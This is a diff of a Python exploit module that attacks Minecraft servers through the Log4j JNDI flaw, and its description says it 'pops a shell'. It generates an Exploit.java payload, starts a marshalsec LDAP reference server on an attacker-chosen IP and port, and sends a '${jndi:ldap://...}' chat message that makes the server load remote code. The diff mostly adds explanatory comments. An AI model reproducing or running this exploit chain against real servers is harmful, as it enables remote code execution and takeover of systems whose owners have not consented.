@@ -8,7 +8,7 @@ class Exploit:
 
     def __init__(self, client: Connection = None, command: str = None, ip: str = None, port: str = None):
         self.name = "Log4j"
-        self.description = "Java vuln that allows user to issue commands to the server to make an LDAP connection"
+        self.description = "Pop shell using Java Log4j package vulnerability."
         self.command = command
         self.client = client
         self.ip = ip
@@ -16,12 +16,10 @@ class Exploit:
         self.success = False
 
     def execute(self) -> tuple[bool, str]:
-        self.client.register_packet_listener(
-            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)
 
-        packet = minecraft.networking.packets.ChatPacket()
+        packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
 
-        genExploit = (
+        genExploit = (  #: Java code to run
                          """
         import java.io.IOException;
         import java.io.InputStream;
@@ -61,19 +59,22 @@ class Exploit:
         }
         """) % (self.ip, self.port)
 
-        with open("Exploit.java", "w") as f:
+        with open("Exploit.java", "w") as f:  #: creates new file named Exploit.java
             f.write(genExploit)
 
         javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL,
-                                  stdout=subprocess.DEVNULL)
-        if javaver != 0:
+                                  stdout=subprocess.DEVNULL)  #: checks for java version
+
+        if javaver != 0:  #: checks for correct java version
             sys.exit()
 
-        url = "http://{}:{}/#Exploit".format(self.ip, self.port)
+        url = "http://{}:{}/#Exploit".format(self.ip, self.port)  #: sets up LDAP server to url
+
+        #: Launches server
         subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
                         "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
 
-        packet.message = "${jndi:ldap://%s:%s/a}" % (self.ip, self.port)
+        packet.message = "${jndi:ldap://%s:%s/a}" % (self.ip, self.port)  #: LDAP RCE
         self.client.write_packet(packet)
 
         return True, "Success in Message"
